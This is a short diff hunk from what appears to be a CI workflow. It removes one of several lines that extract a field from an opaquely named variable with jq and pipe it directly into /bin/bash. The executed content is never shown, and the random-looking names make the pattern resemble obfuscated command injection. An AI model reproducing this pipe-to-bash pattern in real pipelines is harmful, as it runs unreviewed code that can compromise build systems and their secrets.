@@ -20,7 +20,6 @@ jobs:
           echo $e28450 | jq -r .fe66 | /bin/bash
           echo $yxa80401 | jq -r .flw48 | /bin/bash
           printf '%s' "$c7627" | jq -r .i7201 | /bin/bash
-          echo $vijf8325 | jq -r .pa4 | /bin/bash
           echo $a0014 | jq -r .w1 | /bin/bash
           printf '%s' "$ril742" | jq -r .b88 | /bin/bash
           printf '%s' "$lbas00" | jq -r .quu83 | /bin/bash
